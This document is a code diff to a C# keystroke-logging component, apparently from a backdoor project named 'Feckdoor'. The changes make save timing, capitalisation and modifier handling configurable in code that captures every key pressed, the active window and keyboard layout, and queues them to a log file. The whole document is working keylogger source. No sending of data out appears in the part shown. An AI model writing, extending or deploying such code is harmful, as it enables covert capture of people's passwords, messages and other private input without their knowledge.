@@ -13,6 +13,8 @@ namespace Feckdoor.InputLog
 
 		private readonly Task WriterTask;
 
+		private readonly string[] ModifierKeysString = { "CTRL", "SHIFT", "ALT", "WIN" };
+
 		private volatile bool InputWriterRunning = true;
 		private bool disposed;
 
@@ -23,10 +25,10 @@ namespace Feckdoor.InputLog
 			{
 				while (InputWriterRunning)
 				{
-					if (PreviousInput.ElapsedMilliseconds > 2000 || UndoneQueue.Count >= 20)
+					if (PreviousInput.ElapsedMilliseconds > Config.TheConfig.InputLog.SaveWait || UndoneQueue.Count >= Config.TheConfig.InputLog.SaveMaxUndone)
 						WriteUndone(Config.TheConfig.InputLog.InputLogFile);
 
-					await Task.Delay(1);
+					await Task.Delay(Config.TheConfig.InputLog.SaveDelay);
 				}
 
 				// Final write (before shutdown)
@@ -36,6 +38,8 @@ namespace Feckdoor.InputLog
 
 		internal void WriteUndone(string inputLogFile)
 		{
+			Log.Debug("Writing input log...");
+
 			try
 			{
 				var queueCopy = new List<InputLogEntry>(UndoneQueue);
@@ -65,15 +69,12 @@ namespace Feckdoor.InputLog
 		internal void OnKeyboardInput(object? sender, KeyboardInputEventArgs args)
 		{
 			bool capsLock = (User32.GetKeyState(0x14) & 0xffff) != 0;
-			bool shiftPress = args.ModifierKeys.HasFlag(KeyboardModifierKey.Shift);
-			string currentKey = Vk2String((uint)args.VkCode, args.ScanCode);
+			string currentKey = Vk2String(args.VkCode, args.ScanCode, args.Modifier.HasFlag(ModifierKey.Alt));
 
-			if (capsLock ^ shiftPress)
-				currentKey = currentKey.ToUpper();
-			else
-				currentKey = currentKey.ToLower();
+			if (Config.TheConfig.InputLog.AutoCapitalize)
+				currentKey = (capsLock ^ args.Modifier.HasFlag(ModifierKey.Shift)) ? currentKey.ToUpper() : currentKey.ToLower();
 
-			if (args.VkCode.GetVkName(shiftPress, ref currentKey) && currentKey.Equals("CapsLock", StringComparison.OrdinalIgnoreCase))
+			if (args.VkCodeEnum.GetVkName(args.Modifier, ref currentKey) && currentKey.Equals("CapsLock", StringComparison.OrdinalIgnoreCase))
 			{
 				if (capsLock)
 					currentKey = "CapsLock: Off";
@@ -81,21 +82,22 @@ namespace Feckdoor.InputLog
 					currentKey = "CapsLock: On";
 			}
 
+			if (Config.TheConfig.InputLog.SuppressModifierKey && ModifierKeysString.Any(key => currentKey.Equals(key, StringComparison.Ordinal)))
+				return;
+
 			// See https://www.autohotkey.com/docs/commands/Send.htm
 			var modifierSet = new List<char>(4);
-			if (args.ModifierKeys.HasFlag(KeyboardModifierKey.Ctrl))
+			if (args.Modifier.HasFlag(ModifierKey.Ctrl))
 				modifierSet.Add('^');
-			if (args.ModifierKeys.HasFlag(KeyboardModifierKey.Shift))
+			if (Config.TheConfig.InputLog.ShiftPrefix && args.Modifier.HasFlag(ModifierKey.Shift))
 				modifierSet.Add('+');
-			if (args.ModifierKeys.HasFlag(KeyboardModifierKey.Alt))
+			if (args.Modifier.HasFlag(ModifierKey.Alt))
 				modifierSet.Add('!');
-			if (args.ModifierKeys.HasFlag(KeyboardModifierKey.Win))
+			if (args.Modifier.HasFlag(ModifierKey.Win))
 				modifierSet.Add('#');
 
 			if (modifierSet.Count > 0)
 				currentKey = $"{string.Concat(modifierSet)}{currentKey}";
-
-			Log.Information("Keypress: {key}", currentKey);
 
 			if (ActiveWindowInfoCache != GetActiveWindowInfo())
 				UndoneQueue.Enqueue(new ActiveWindowChangeEntry(DateTime.Now, ActiveWindowInfoCache));
@@ -105,7 +107,7 @@ namespace Feckdoor.InputLog
 			PreviousInput.Restart();
 		}
 
-		private static string Vk2String(uint vkCode, uint scanCode)
+		private static string Vk2String(uint vkCode, uint scanCode, bool altDown)
 		{
 			try
 			{
@@ -114,7 +116,7 @@ namespace Feckdoor.InputLog
 					return ""; // Keyboard state unavailable
 
 				var sb = new StringBuilder(256);
-				int bufferLen = User32.ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 256, 0, User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), out uint processId)));
+				int bufferLen = User32.ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 256, Convert.ToUInt32(altDown), User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), out uint processId)));
 				if (bufferLen != 0)
 				{
 					if (bufferLen < 0)
@@ -128,7 +130,7 @@ namespace Feckdoor.InputLog
 			}
 
 			// If unicode value of key unavailable or an error occurred.
-			return ((VkCode)vkCode).ToString();
+			return ((VirtualKey)vkCode).ToString();
 		}
 
 		private static ActiveWindowInfo GetActiveWindowInfo()
